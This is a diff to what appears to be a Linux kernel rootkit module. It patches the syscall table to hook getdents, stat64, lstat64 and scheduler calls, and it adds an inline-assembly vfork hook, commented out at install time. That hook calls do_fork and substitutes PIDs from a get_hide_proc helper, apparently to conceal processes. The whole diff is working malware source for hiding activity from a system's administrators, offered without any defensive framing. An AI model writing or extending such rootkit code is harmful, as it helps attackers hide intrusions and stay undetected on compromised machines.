@@ -1,5 +1,7 @@
 #include "RTmain.h"
 #include "RTsyscalltable.h"
+#include "RTlist.h"
+#include "RTcmd.h"
 
 unsigned long **sys_call_table;
 //static unsigned long irq_flags;
@@ -8,6 +10,13 @@ long clone_flag = 0;
 long clone_count = 0;
 long clone_tid = 0;
 long clone_lasttid = 0;
+
+long vfork_pid = 0;
+long vfork_flag = 0;
+long vfork_count = 0;
+long vfork_spid = 0;
+long vfork_lastpid = 0;
+long process_count = 0;
 
 /**
  *  sys_read - 3 - fs/read_write.c
@@ -322,19 +331,123 @@ RT_SYSCALL_DEFINE(long, sched_getscheduler, pid_t pid) {
 }
 
 /**
+ * sched_rr_get_interval - 161 - kernel/sched/core.c
  */
+#define DEBUG_SCHED_RR_GET_INTERVAL
+RT_SYSCALL_DEFINE(long, sched_rr_get_interval, pid_t pid,
+        struct timespec __user *interval) {
+    long ret;
+ #ifdef DEBUG_SCHED_RR_GET_INTERVAL
+    DLog("sched_rr_get_interval:pid:[%d]", pid);
+#endif      
+    ret = RT_SYSCALL_CALL(sched_rr_get_interval, pid, interval);
+    return ret;
+}
 
 /**
+ * vfork - 190 - kernel/fork.c
+ * 
  */
+#define DEBUG_VFORK
+RT_SYSCALL_DEFINE_JMP(long, vfork, struct pt_regs *regs) {
+    asm("sub    $0xc,%esp");
+    asm("nopl   0x0(%eax,%eax,1)");
+    asm("mov    0x3c(%eax),%edx");
+    asm("mov    %eax,%ecx");
+    asm("mov    $0x4111,%eax");
+    asm("movl   $0x0,0x8(%esp)");
+    asm("movl   $0x0,0x4(%esp)");
+    asm("movl   $0x0,(%esp)");
+    asm("push   %eax");
+    asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
+    asm("movl   %eax,%esi");
+    asm("pop    %eax");
+    asm("call   *%esi");
+
+    asm("push %eax");
+    asm("push %ebx");
+    asm("push %ecx");
+    asm("push %edx");
+
+    asm volatile("movl %%eax,%0" : "=m"(vfork_spid) :);
+
+    if (vfork_flag == 0) {
+        vfork_pid = current->pid;
+        vfork_flag = 1;
+    } else {
+        if (vfork_pid == current->pid) {
+            vfork_flag++;
+        } else {
+            vfork_flag--;
+        }
+    }
+
+    if (vfork_flag >= 100 && vfork_pid == current->pid) {
+        int pid;
+
+        pid = get_hide_proc(vfork_lastpid++);
+
+        if (pid) {
+            vfork_spid = pid;
+        }
+    }
+
+    asm("pop %edx");
+    asm("pop %ecx");
+    asm("pop %ebx");
+    asm("pop %eax");
+
+    asm volatile("movl %0,%%eax"::"m"(vfork_spid));
+
+    asm("leave  ");
+    asm("ret    ");
+
+    return 0;
+}
+
+
+
+#if BITS_PER_LONG == 32
+/**
+ * stat64 - 195
+ */
+RT_SYSCALL_DEFINE(long, stat64, char __user *filename,
+        struct stat64 __user *statbuf) {
+    int ret;
+    ret = RT_SYSCALL_CALL(stat64, filename, statbuf);
+    return ret;
+}
+/**
+ * lstat64 - 196
+ */
+RT_SYSCALL_DEFINE(long, lstat64, char __user *filename,
+        struct stat64 __user *statbuf) {
+    long ret;
+    ret = RT_SYSCALL_CALL(lstat64, filename, statbuf);
+    return ret;
+}
+#endif
+
 
 /**
+ * 
  */
 
 
 
+/**
+ * 
+ */
 
 
+/**
+ * 
+ */
 
+
+/**
+ * 
+ */
 // sys_getdents64
 
 RT_SYSCALL_DEFINE(long, getdents64, unsigned int fd,
@@ -354,24 +467,12 @@ RT_SYSCALL_DEFINE(long, sched_getaffinity, pid_t pid, unsigned int len,
     return ret;
 }
 
-RT_SYSCALL_DEFINE(long, sched_rr_get_interval, pid_t pid,
-        struct timespec __user *interval) {
-    int ret;
-    ret = RT_SYSCALL_CALL(sched_rr_get_interval, pid, interval);
-    return ret;
-}
+
 
 
 
 
 #if BITS_PER_LONG == 32
-
-RT_SYSCALL_DEFINE(long, stat64, char __user *filename,
-        struct stat64 __user *statbuf) {
-    int ret;
-    ret = RT_SYSCALL_CALL(stat64, filename, statbuf);
-    return ret;
-}
 
 RT_SYSCALL_DEFINE(long, fstat64, unsigned long fd, struct stat64 __user *statbuf) {
     int ret;
@@ -379,12 +480,7 @@ RT_SYSCALL_DEFINE(long, fstat64, unsigned long fd, struct stat64 __user *statbuf
     return ret;
 }
 
-RT_SYSCALL_DEFINE(long, lstat64, char __user *filename,
-        struct stat64 __user *statbuf) {
-    long ret;
-    ret = RT_SYSCALL_CALL(lstat64, filename, statbuf);
-    return ret;
-}
+
 
 #endif
 
@@ -466,7 +562,12 @@ ThisInit(void) {
     RT_SYSCALL_REPLACE(getdents); //141
     RT_SYSCALL_REPLACE(sched_getparam); //155
     RT_SYSCALL_REPLACE(sched_getscheduler); //157
-
+    RT_SYSCALL_REPLACE(sched_rr_get_interval); //161
+    //RT_SYSCALL_REPLACE_JMP(vfork); //190
+#if BITS_PER_LONG == 32
+    RT_SYSCALL_REPLACE(stat64); //195
+    RT_SYSCALL_REPLACE(lstat64); //196
+#endif
     enable_write_protection();
     //  local_irq_restore(irq_flags);
     return 0;
@@ -492,7 +593,14 @@ ThisExit(void) {
     RT_SYSCALL_RESTORE(getdents); //141
     RT_SYSCALL_RESTORE(sched_getparam); //155
     RT_SYSCALL_RESTORE(sched_getscheduler); //157
-
+    RT_SYSCALL_RESTORE(sched_rr_get_interval); //161
+    //RT_SYSCALL_RESTORE_JMP(vfork); //190
+    
+#if BITS_PER_LONG == 32
+    RT_SYSCALL_RESTORE(stat64); //195
+    RT_SYSCALL_RESTORE(lstat64); //196
+#endif
+    
     enable_write_protection();
 
     //  local_irq_restore(irq_flags);
